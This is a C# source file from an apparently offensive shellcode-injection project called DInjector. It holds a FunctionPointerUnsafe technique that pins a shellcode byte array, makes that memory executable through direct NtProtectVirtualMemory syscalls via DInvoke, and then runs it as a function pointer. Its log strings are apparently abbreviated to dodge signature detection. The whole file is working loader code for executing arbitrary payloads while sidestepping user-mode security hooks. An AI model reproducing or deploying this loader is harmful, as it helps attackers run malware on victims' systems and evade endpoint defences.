﻿using System;
using System.Runtime.InteropServices;

using DI = DInvoke;
using static DInvoke.Data.Native;

namespace DInjector
{
    class FunctionPointerUnsafe
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void FunctionPtr();

        public static void Execute(byte[] shellcode, bool debug = false)
        {
            unsafe
            {
                fixed (byte* ptr = shellcode)
                {
                    IntPtr baseAddress = (IntPtr)ptr;

                    #region NtProtectVirtualMemory (PAGE_EXECUTE_READ)

                    IntPtr hProcess = IntPtr.Zero; // Process.GetCurrentProcess().Handle
                    IntPtr protectAddress = baseAddress;
                    IntPtr regionSize = (IntPtr)shellcode.Length;
                    uint oldProtect = 0;

                    var ntstatus = Syscalls.NtProtectVirtualMemory(
                        hProcess,
                        ref protectAddress,
                        ref regionSize,
                        DI.Data.Win32.WinNT.PAGE_EXECUTE_READ,
                        ref oldProtect);

                    if (ntstatus == NTSTATUS.Success)
                        Console.WriteLine("(FunctionPointerUnsafe) [+] NtPrtctVrtlMmry, PAGE_EXECUTE_READ");
                    else
                        throw new Exception($"(FunctionPointerUnsafe) [-] NtPrtctVrtlMmry, PAGE_EXECUTE_READ: {ntstatus}");

                    #endregion

                    FunctionPtr f = (FunctionPtr)Marshal.GetDelegateForFunctionPointer(baseAddress, typeof(FunctionPtr));
                    f();
                }
            }
        }
    }
}